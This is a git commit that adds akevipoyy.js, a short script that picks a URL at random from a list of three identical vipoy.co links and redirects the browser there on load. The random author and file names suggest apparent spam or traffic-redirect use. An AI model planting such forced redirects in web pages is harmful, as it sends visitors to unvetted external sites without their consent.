905e64f9906038733b1362c24bc4f62f225c8100
idhoiphiy <idhoiphiy.o@gmail.com>
2026-04-28 14:45:00 +0700

    Create akevipoyy.js

---
+++ akevipoyy.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+
+'https://vipoy.co/view/jt8olwxg',
+'https://vipoy.co/view/jt8olwxg',
+'https://vipoy.co/view/jt8olwxg'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
